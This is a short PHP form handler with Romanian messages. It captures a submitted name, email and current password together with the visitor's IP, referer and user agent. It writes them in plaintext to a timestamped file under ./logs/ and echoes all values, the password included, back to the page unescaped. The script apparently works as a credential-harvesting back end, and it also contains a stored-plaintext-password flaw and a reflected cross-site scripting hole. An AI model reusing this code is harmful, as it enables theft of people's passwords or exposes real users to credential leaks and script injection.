<?php
  $firstName = $_POST["firstName"];
  $lastName = $_POST["lastName"];
  $email = $_POST["emailAddress"];
  $password = $_POST["passwordCurrent"];
  $formattedDate = date('Ymd-His');
  $currentDate = date('Y-m-d H:i:s');
  $fileName = "file-post-".$formattedDate.".txt";
  
  $current = "Data curenta: ".$currentDate."\nSite remote: ".$_SERVER["REMOTE_ADDR"]."\nReferer: ".$_SERVER["HTTP_REFERER"]."\nUser Agent: ".$_SERVER["HTTP_USER_AGENT"]."\n\nFirst Name: ".$firstName."\nLast Name: ".$lastName."\nEmail: ".$email."\nPassword: ".$password;
  file_put_contents("logs/".$fileName, $current);
?>

<html>
<body>

First Name: <?php echo $firstName; ?><br>
Last Name: <?php echo $lastName; ?><br>
Email: <?php echo $email; ?><br>
Password: <?php echo $password; ?><br>

<h3>Un fisier a fost generat in ./logs/<?php echo $fileName; ?></h3>


</body>
</html> 
